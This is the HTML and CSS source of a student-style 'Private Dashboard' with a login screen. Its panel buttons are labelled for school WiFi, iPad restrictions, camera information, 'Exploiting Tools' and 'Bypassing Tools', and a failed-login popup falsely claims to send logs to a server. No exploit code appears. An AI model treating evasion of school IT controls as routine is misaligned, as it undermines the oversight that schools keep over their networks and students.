<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* Global Styles */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }
    
    body {
      margin: 0; padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      transition: background-color 0.3s, color 0.3s;
      color: #fff;
    }

    /* Initial Loading Screen Styles */
    .loading-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #000;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      color: #fff;
    }

    .rotating-box {
      width: 100px;
      height: 100px;
      background: linear-gradient(45deg, #ff8c00, #ff4500, #ff8c00); /* Orange to Red Gradient */
      border-radius: 10px;
      animation: rotate3D 3s infinite linear;
      margin-bottom: 20px;
      box-shadow: 0 0 20px rgba(255, 69, 0, 0.5);
      will-change: transform;
    }

    @keyframes rotate3D {
      0% { transform: perspective(500px) rotateX(0deg) rotateY(0deg); }
      25% { transform: perspective(500px) rotateX(90deg) rotateY(45deg); }
      50% { transform: perspective(500px) rotateX(180deg) rotateY(90deg); }
      75% { transform: perspective(500px) rotateX(270deg) rotateY(135deg); }
      100% { transform: perspective(500px) rotateX(360deg) rotateY(180deg); }
    }

    .loading-text {
      font-family: 'Courier New', monospace;
      font-size: 1.8em;
      font-weight: bold;
      animation: gradientText 2s infinite alternate;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-image: linear-gradient(to right, #ff8c00, #ff4500); /* Orange to Red Gradient */
    }

    @keyframes gradientText {
      0% { background-position: 0% 50%; }
      100% { background-position: 100% 50%; }
    }

    .loading-complete-text {
      font-family: 'Courier New', monospace;
      font-size: 1.8em;
      font-weight: bold;
      color: #2ecc71; /* Green for complete */
    }

    /* Login System Styles */
    body.login-body {
      background: #000;
    }
    
    .login-wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 15px;
    }

    .login-quick-bar {
      display: flex;
      gap: 10px;
      margin-bottom: 15px;
      flex-wrap: wrap;
    }

    .login-quick-bar button {
      background-color: #333;
      border: none;
      padding: 8px 12px;
      border-radius: 8px;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .login-quick-bar button:hover {
      background-color: #555;
    }
    
    .login-box {
      background: #1c1c1c; /* Darker background */
      border-radius: 15px; /* More rounded corners */
      border: 2px solid #555; /* Softer border */
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.2); /* Softer shadow */
      width: 380px; /* Slightly wider */
      padding: 35px 30px; /* More padding */
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s;
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: #555; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2); }
    }
    
    .login-box h2 {
      font-size: 2em; /* Slightly larger heading */
      margin-bottom: 25px;
      font-family: 'Courier New', monospace;
      color: #ff914d; /* Accent color */
    }
    
    .login-box input {
      width: 100%;
      padding: 14px; /* More padding */
      margin-bottom: 18px; /* More spacing */
      background: #333; /* Darker input background */
      border: 1px solid #555; /* Subtle border */
      color: white;
      border-radius: 10px; /* More rounded input */
      font-size: 1.05em;
    }
    
    .login-box .control-group {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 15px;
    }

    .login-box .control-group label {
      display: flex;
      align-items: center;
      gap: 10px;
      cursor: pointer;
      font-size: 0.95em;
      color: #ccc;
    }

    .login-box button {
      width: 100%;
      padding: 14px;
      background-color: #ff914d; /* Accent color for button */
      color: black;
      font-size: 1.1em;
      font-weight: bold;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s;
    }
    
    .login-box button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px);
    }
    
    .attempt-counter, .error-message {
      margin-top: 15px;
      font-size: 0.9em;
      color: #ff6347; /* Tomato red for errors */
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: #1c1c1c;
      border: 2px solid #ff6347; /* Red border for popup */
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(255, 99, 71, 0.5);
      z-index: 100;
    }
    
    .popup input {
      margin-bottom: 15px;
      background: #333;
      border: 1px solid #555;
      color: white;
      border-radius: 8px;
    }

    .time-date-box {
      background: #1c1c1c;
      border: 1px solid #555;
      border-radius: 10px;
      padding: 15px;
      width: 380px;
      text-align: center;
      font-family: 'Courier New', monospace;
      font-size: 1.1em;
      color: #ff914d;
      box-shadow: 0 0 8px rgba(255, 145, 77, 0.3);
    }

    /* Toggle Switch Styling */
    .switch {
      position: relative;
      display: inline-block;
      width: 40px;
      height: 24px;
    }

    .switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }

    .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #ccc;
      transition: .4s;
      border-radius: 24px;
    }

    .slider:before {
      position: absolute;
      content: "";
      height: 16px;
      width: 16px;
      left: 4px;
      bottom: 4px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }

    input:checked + .slider {
      background-color: #2ecc71; /* Green when checked */
    }

    input:focus + .slider {
      box-shadow: 0 0 1px #2ecc71;
    }

    input:checked + .slider:before {
      transform: translateX(16px);
    }

    /* Dashboard Styles */
    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a;
      color: #f9f2dc;
      padding: 20px;
      flex-direction: column;
      zoom: 1; /* Initial zoom level */
    }

    /* Theme Variations */
    body.dashboard-body.light-theme {
      background-color: #f9f2dc;
      color: #1a1a1a;
    }
    body.dashboard-body.blue-theme {
      background-color: #2a3d5f;
      color: #e0f2f7;
    }
    body.dashboard-body.green-theme {
      background-color: #2d5d4d;
      color: #e0ffe0;
    }
    body.dashboard-body.purple-theme {
      background-color: #4b2d5d;
      color: #ffe0ff;
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #ff914d;
      padding: 15px 25px;
      border-radius: 12px;
      color: #000;
      margin-bottom: 20px;
      width: 100%;
      max-width: 1200px;
    }

    body.dashboard-body.light-theme .dashboard-header { background: #ffd966; }
    body.dashboard-body.blue-theme .dashboard-header { background: #5fa2dd; }
    body.dashboard-body.green-theme .dashboard-header { background: #6dd6b0; }
    body.dashboard-body.purple-theme .dashboard-header { background: #a25fdd; }


    .dashboard-header h1 {
      font-size: 24px;
      margin: 0;
    }

    .user-info {
      font-weight: bold;
    }

    .version-box {
      background: #ffd966;
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
    }
    body.dashboard-body.light-theme .version-box { background: #ffe082; }
    body.dashboard-body.blue-theme .version-box { background: #8cd0f7; }
    body.dashboard-body.green-theme .version-box { background: #8af7d2; }
    body.dashboard-body.purple-theme .version-box { background: #c38af7; }


    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 10px; 
      flex-wrap: wrap;
      width: 100%;
      max-width: 1200px;
    }

    .quick-bar button, .quick-bar input {
      background-color: #ff914d;
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      min-width: 110px;
      white-space: nowrap;
    }

    .quick-bar button:hover {
      background-color: #ffb67a;
    }
    body.dashboard-body.light-theme .quick-bar button, body.dashboard-body.light-theme .quick-bar input { background: #ffd966; }
    body.dashboard-body.blue-theme .quick-bar button, body.dashboard-body.blue-theme .quick-bar input { background: #5fa2dd; }
    body.dashboard-body.green-theme .quick-bar button, body.dashboard-body.green-theme .quick-bar input { background: #6dd6b0; }
    body.dashboard-body.purple-theme .quick-bar button, body.dashboard-body.purple-theme .quick-bar input { background: #a25fdd; }


    #panicBtn {
      background: #ff4c4c !important;
      color: white !important;
    }
    #panicBtn:hover {
      background: #ff7f7f !important;
    }

    .announcement-bar {
      width: 100%;
      background-color: #ff914d;
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
      max-width: 1200px;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    body.dashboard-body.light-theme .announcement-bar { background-color: #ffd966; color: #000; }
    body.dashboard-body.blue-theme .announcement-bar { background: #5fa2dd; color: #000; }
    body.dashboard-body.green-theme .announcement-bar { background: #6dd6b0; color: #000; }
    body.dashboard-body.purple-theme .announcement-bar { background: #a25fdd; color: #000; }


    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
      width: 100%;
      max-width: 1200px;
    }

    .box {
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s;
      flex: 1 1 300px;
    }

    body.dashboard-body.light-theme .box { background-color: #ffd966; color: #000; box-shadow: 0 0 15px rgba(255, 145, 77, 0.6); }
    body.dashboard-body.blue-theme .box { background: #4a5c80; color: #e0f2f7; box-shadow: 0 0 15px rgba(95, 162, 221, 0.3); }
    body.dashboard-body.green-theme .box { background: #4d7d6d; color: #e0ffe0; box-shadow: 0 0 15px rgba(109, 214, 176, 0.3); }
    body.dashboard-body.purple-theme .box { background: #6b4d7d; color: #ffe0ff; box-shadow: 0 0 15px rgba(162, 95, 221, 0.3); }

    .box h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: #ffbf80;
    }

    body.dashboard-body.light-theme .box h2 { color: #994d00; }
    body.dashboard-body.blue-theme .box h2 { color: #8cd0f7; }
    body.dashboard-body.green-theme .box h2 { color: #8af7d2; }
    body.dashboard-body.purple-theme .box h2 { color: #c38af7; }

    .box p, .box ul {
      font-size: 14px;
    }

    .update-entry {
      background: #40210f;
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: #ffccb3;
    }
    body.dashboard-body.light-theme .update-entry { background: #ffd999; color: #994d00; }
    body.dashboard-body.blue-theme .update-entry { background: #6a7d9f; color: #e0f2f7; }
    body.dashboard-body.green-theme .update-entry { background: #6d8d7d; color: #e0ffe0; }
    body.dashboard-body.purple-theme .update-entry { background: #8b6d8d; color: #ffe0ff; }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: #333;
      border-radius: 4px;
    }

    .today {
      background: #ff914d !important;
      font-weight: bold;
      color: black;
    }

    body.dashboard-body.light-theme .calendar div { background: #ffd966; color: #000; }
    body.dashboard-body.light-theme .today { background: #994d00 !important; color: #ffd966; }

    body.dashboard-body.blue-theme .calendar div { background: #5f7a9f; color: #e0f2f7; }
    body.dashboard-body.blue-theme .today { background: #5fa2dd !important; color: #000; }

    body.dashboard-body.green-theme .calendar div { background: #5d8d7d; color: #e0ffe0; }
    body.dashboard-body.green-theme .today { background: #6dd6b0 !important; color: #000; }

    body.dashboard-body.purple-theme .calendar div { background: #7b5d8d; color: #ffe0ff; }
    body.dashboard-body.purple-theme .today { background: #a25fdd !important; color: #000; }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      width: 100%;
      max-width: 1200px;
    }

    #notesCanvas {
      border: 2px solid #ff914d;
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
    }

    #canvasControls {
      margin-top: 10px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
    }

    #canvasControls button, #canvasControls input[type="color"], #canvasControls input[type="range"] {
      background-color: #ff914d;
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      margin: 0 5px;
      height: 38px; /* Standardize height */
    }

    #canvasControls button:hover {
      background-color: #ffb67a;
    }

    #canvasControls input[type="color"] {
      width: 40px;
      padding: 0;
      border: 1px solid #333;
      overflow: hidden;
      cursor: pointer;
    }
    #canvasControls input[type="range"] {
      padding: 0 5px;
      background: #333;
      color: #fff;
      border: none;
      cursor: grab;
    }

    .motivation-box {
      background-color: #333;
      color: #ffd966;
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
    }
    body.dashboard-body.light-theme .motivation-box { background-color: #fff3cc; color: #994d00; box-shadow: 0 0 12px rgba(255, 145, 77, 0.8); }
    body.dashboard-body.blue-theme .motivation-box { background: #5f7a9f; color: #8cd0f7; }
    body.dashboard-body.green-theme .motivation-box { background: #5d8d7d; color: #8af7d2; }
    body.dashboard-body.purple-theme .motivation-box { background: #7b5d8d; color: #c38af7; }

    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.3);
      width: 100%;
      max-width: 1200px;
    }

    body.dashboard-body.light-theme .info-panel { background-color: #ffd966; color: #000; }
    body.dashboard-body.blue-theme .info-panel { background: #4a5c80; color: #e0f2f7; }
    body.dashboard-body.green-theme .info-panel { background: #4d7d6d; color: #e0ffe0; }
    body.dashboard-body.purple-theme .info-panel { background: #6b4d7d; color: #ffe0ff; }

    .info-panel h2 {
      color: #ff914d;
      margin-bottom: 15px;
    }

    body.dashboard-body.light-theme .info-panel h2 { color: #994d00; }
    body.dashboard-body.blue-theme .info-panel h2 { color: #8cd0f7; }
    body.dashboard-body.green-theme .info-panel h2 { color: #8af7d2; }
    body.dashboard-body.purple-theme .info-panel h2 { color: #c38af7; }

    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 8px;
      background: #333;
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
    }

    body.dashboard-body.light-theme .wifi-grid div { background: #ffd999; }
    body.dashboard-body.blue-theme .wifi-grid div { background: #5f7a9f; }
    body.dashboard-body.green-theme .wifi-grid div { background: #5d8d7d; }
    body.dashboard-body.purple-theme .wifi-grid div { background: #7b5d8d; }

    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-entry div {
      padding: 8px;
      background: #40210f;
      border-radius: 6px;
      text-align: center;
    }

    .wifi-level-high { background-color: #4CAF50 !important; color: white; } /* Green */
    .wifi-level-medium { background-color: #FFC107 !important; color: black; } /* Yellow */
    .wifi-level-low { background-color: #F44336 !important; color: white; } /* Red */
    .wifi-level-unknown { background-color: #607D8B !important; color: white; } /* Blue Grey */

    body.dashboard-body.light-theme .wifi-entry div { background: #ffd999; }
    body.dashboard-body.blue-theme .wifi-entry div { background: #6a7d9f; }
    body.dashboard-body.green-theme .wifi-entry div { background: #6d8d7d; }
    body.dashboard-body.purple-theme .wifi-entry div { background: #8b6d8d; }

    .handbook-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons a, .links-list a, .exploit-buttons a, .settings-grid button, .handbook-buttons button, .bypass-buttons button {
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      text-decoration: none;
      text-align: center;
      display: block; /* Ensure buttons and links are block-level */
    }

    .handbook-buttons a:hover, .links-list a:hover, .exploit-buttons a:hover, .settings-grid button:hover, .handbook-buttons button:hover, .bypass-buttons button:hover {
      background-color: #ffb67a;
    }
    body.dashboard-body.light-theme .handbook-buttons a, body.dashboard-body.light-theme .links-list a, body.dashboard-body.light-theme .exploit-buttons a, body.dashboard-body.light-theme .settings-grid button, body.dashboard-body.light-theme .handbook-buttons button, body.dashboard-body.light-theme .bypass-buttons button { background: #ffd966; }
    body.dashboard-body.blue-theme .handbook-buttons a, body.dashboard-body.blue-theme .links-list a, body.dashboard-body.blue-theme .exploit-buttons a, body.dashboard-body.blue-theme .settings-grid button, body.dashboard-body.blue-theme .handbook-buttons button, body.dashboard-body.blue-theme .bypass-buttons button { background: #5fa2dd; }
    body.dashboard-body.green-theme .handbook-buttons a, body.dashboard-body.green-theme .links-list a, body.dashboard-body.green-theme .exploit-buttons a, body.dashboard-body.green-theme .settings-grid button, body.dashboard-body.green-theme .handbook-buttons button, body.dashboard-body.green-theme .bypass-buttons button { background: #6dd6b0; }
    body.dashboard-body.purple-theme .handbook-buttons a, body.dashboard-body.purple-theme .links-list a, body.dashboard-body.purple-theme .exploit-buttons a, body.dashboard-body.purple-theme .settings-grid button, body.dashboard-body.purple-theme .handbook-buttons button, body.dashboard-body.purple-theme .bypass-buttons button { background: #a25fdd; }


    .links-list {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .exploit-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .coming-soon {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
    }
    body.dashboard-body.light-theme .coming-soon { background: #ffd999; }
    body.dashboard-body.blue-theme .coming-soon { background: #6a7d9f; }
    body.dashboard-body.green-theme .coming-soon { background: #6d8d7d; }
    body.dashboard-body.purple-theme .coming-soon { background: #8b6d8d; }

    .info-text {
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }
    body.dashboard-body.light-theme .info-text { background: #ffd999; }
    body.dashboard-body.blue-theme .info-text { background: #6a7d9f; }
    body.dashboard-body.green-theme .info-text { background: #6d8d7d; }
    body.dashboard-body.purple-theme .info-text { background: #8b6d8d; }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: #40210f;
      padding: 12px;
      border-radius: 8px;
    }
    body.dashboard-body.light-theme .school-info-item { background: #ffd999; }
    body.dashboard-body.blue-theme .school-info-item { background: #6a7d9f; }
    body.dashboard-body.green-theme .school-info-item { background: #6d8d7d; }
    body.dashboard-body.purple-theme .school-info-item { background: #8b6d8d; }

    .school-info-label {
      font-weight: bold;
      color: #ff914d;
      margin-bottom: 5px;
    }
    body.dashboard-body.light-theme .school-info-label { color: #994d00; }
    body.dashboard-body.blue-theme .school-info-label { color: #8cd0f7; }
    body.dashboard-body.green-theme .school-info-label { color: #8af7d2; }
    body.dashboard-body.purple-theme .school-info-label { color: #c38af7; }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .ipad-options button {
      flex: 1;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    .ipad-options button:hover {
      background-color: #ffb67a;
    }

    .ipad-content, .bypass-content {
      display: none;
      background: #40210f;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }
    
    body.dashboard-body.light-theme .ipad-content, body.dashboard-body.light-theme .bypass-content { background: #ffd999; }
    body.dashboard-body.blue-theme .ipad-content, body.dashboard-body.blue-theme .bypass-content { background: #6a7d9f; }
    body.dashboard-body.green-theme .ipad-content, body.dashboard-body.green-theme .bypass-content { background: #6d8d7d; }
    body.dashboard-body.purple-theme .ipad-content, body.dashboard-body.purple-theme .bypass-content { background: #8b6d8d; }

    /* New Dashboard Panels */
    .dashboard-notification {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: #2ecc71; /* Green */
      color: white;
      padding: 15px 25px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
      z-index: 1000;
      opacity: 0;
      transform: translateX(100%);
      transition: opacity 0.5s ease-out, transform 0.5s ease-out;
    }
    .dashboard-notification.show {
      opacity: 1;
      transform: translateX(0);
    }
    .settings-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .settings-grid .setting-toggle {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background-color: #40210f;
      padding: 12px;
      border-radius: 8px;
      color: #ffccb3;
      font-weight: bold;
    }
    body.dashboard-body.light-theme .settings-grid .setting-toggle { background: #ffd999; color: #994d00; }
    body.dashboard-body.blue-theme .settings-grid .setting-toggle { background: #6a7d9f; color: #e0f2f7; }
    body.dashboard-body.green-theme .settings-grid .setting-toggle { background: #6d8d7d; color: #e0ffe0; }
    body.dashboard-body.purple-theme .settings-grid .setting-toggle { background: #8b6d8d; color: #ffe0ff; }

    .log-entry {
      background: #40210f;
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      font-size: 0.9em;
      color: #ffccb3;
    }
    body.dashboard-body.light-theme .log-entry { background: #ffd999; color: #994d00; }
    body.dashboard-body.blue-theme .log-entry { background: #6a7d9f; color: #e0f2f7; }
    body.dashboard-body.green-theme .log-entry { background: #6d8d7d; color: #e0ffe0; }
    body.dashboard-body.purple-theme .log-entry { background: #8b6d8d; color: #ffe0ff; }

    #calculatorDisplay {
      background-color: #333;
      color: white;
      padding: 10px;
      border-radius: 5px;
      margin-bottom: 10px;
      font-size: 1.5em;
      text-align: right;
    }
    .calculator-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 5px;
    }
    .calculator-grid button {
      padding: 15px;
      font-size: 1.1em;
      background-color: #555;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .calculator-grid button:hover {
      background-color: #777;
    }
    .calculator-grid button.operator {
      background-color: #ff914d;
      color: black;
    }
    .calculator-grid button.operator:hover {
      background-color: #ffb67a;
    }

    .unit-converter-input {
      display: flex;
      gap: 10px;
      margin-bottom: 10px;
    }
    .unit-converter-input input, .unit-converter-input select {
      flex: 1;
      padding: 8px;
      border-radius: 5px;
      border: 1px solid #555;
      background-color: #333;
      color: white;
    }
    #unitResult {
      font-size: 1.2em;
      font-weight: bold;
      margin-top: 15px;
      color: #ff914d;
    }

    .timer-controls {
      display: flex;
      gap: 10px;
      margin-top: 15px;
      flex-wrap: wrap;
    }
    .timer-display {
      font-size: 2em;
      font-family: 'Courier New', monospace;
      margin-bottom: 15px;
      text-align: center;
      width: 100%;
      color: #ff914d;
    }
    .timer-input {
      display: flex;
      gap: 5px;
      margin-bottom: 10px;
    }
    .timer-input input {
      width: 60px;
      padding: 8px;
      border-radius: 5px;
      border: 1px solid #555;
      background-color: #333;
      color: white;
      text-align: center;
    }

  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body id="bodyElement">

  <!-- Initial Loading Screen -->
  <div class="loading-screen" id="initialLoadingScreen">
    <div class="rotating-box"></div>
    <div class="loading-text" id="initialLoadingText">Initializing System..</div>
  </div>

  <!-- Login System Wrapper -->
  <div class="login-wrapper" id="loginWrapper" style="display: none;">
    <div class="login-quick-bar">
      <button id="loginPanicBtn">🚨 Panic</button>
      <button id="loginZoomInBtn">➕ Zoom In</button>
      <button id="loginZoomOutBtn">➖ Zoom Out</button>
    </div>
    
    <div class="login-box" id="loginBox">
      <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

      <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
      <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
      <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

      <div class="control-group">
        <label for="showPassword">
          <input type="checkbox" id="showPasswordToggle" style="display: none;" />
          <span class="slider"></span>
          <span>Show Password</span>
        </label>
        <label for="timeFormatToggle">
          <input type="checkbox" id="timeFormatToggle" style="display: none;" />
          <span class="slider"></span>
          <span>24 Hour Format</span>
        </label>
      </div>

      <button id="submitBtn">Submit</button>

      <div class="error-message" id="errorMsg"></div>
      <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div>

      <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
        <p>Too many failed attempts.</p>
        <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
        <button id="resetBtn">Reset Counter</button>
      </div>
    </div>
    <div class="time-date-box" id="loginTimeDateBox">
      <span id="loginCurrentTime">00:00:00</span> | <span id="loginCurrentDate">--</span>
    </div>
  </div>

  <!-- Dashboard Loading Screen -->
  <div class="loading-screen" id="dashboardLoadingScreen" style="display: none;">
    <div class="rotating-box"></div>
    <div class="loading-text" id="dashboardLoadingText">Loading Dashboard..</div>
    <div style="margin-top: 30px; font-size: 1.2em; font-family: 'Courier New', monospace; color: #9f9f9f;">
      <span id="codeAnimation"></span>
    </div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-notification" id="dashboardWelcomeNotification"></div>

    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.6</div>
    </div>

    <div class="quick-bar">
      <input type="text" id="searchBar" placeholder="Search sections..." />
      <button id="searchButton">Search</button>
      <button id="downloadActivityLogsBtn">⬇️ Activity Logs</button>
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="logoutBtn">🔓 Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨</span>
    </div>
    
    <div class="main-row" id="mainGrid">
      
      <div class="box" id="calendarPanel">
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
      </div>
    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap; margin-top: 20px; width: 100%; max-width: 1200px;">
      <div class="box" id="updatesPanel" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
      </div>

      <div class="box" id="notificationsPanel" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔔 Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
      </div>
    </div>

    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
      <button onclick="dashboard.togglePanel('wifiPanel')">📡 School WiFi Information</button>
      <button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button>
      <button onclick="dashboard.togglePanel('handbookPanel')">📘 Student Handbooks Information</button>
      <button onclick="dashboard.togglePanel('mapPanel')">🏫 School Building Map Information</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">🌐 Student Website's Information</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">👩‍🏫 Teacher Websites Information</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">📞 School Phone Directory Information</button>
      <button onclick="dashboard.togglePanel('cameraPanel')">📷 School Camera Information</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')">🏫 School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel')">🧨 Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel')">🚪 Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel')">🔐 VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel')">🎵 Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')">🎹 Keyboard Tricks</button>
      
      <!-- Moved from quickbar and new utility buttons -->
      <button id="notesBtn">📒 Notes</button>
      <button id="exportNotesBtn">💾 Export Notes</button>
      <button id="screenshotBtn">📸 Screenshot</button>
      <button id="toggleSectionsBtn">⬆️ Toggle Sections</button>
      <button id="fixIssuesBtn">🛠️ Fix Issues</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="zoomInBtn">➕ Zoom In</button>
      <button id="zoomOutBtn">➖ Zoom Out</button>
      <button id="restartBtn">🔄 Restart</button>
      <button onclick="dashboard.togglePanel('settingsPanel')">⚙️ Settings</button>
      <button onclick="dashboard.togglePanel('timerStopwatchPanel')">⏱️ Timer/Stopwatch</button>
      <button onclick="dashboard.togglePanel('activityLogPanel')">📜 Activity Logs</button>
      <button onclick="dashboard.togglePanel('loginHistoryPanel')">📝 Login History</button>
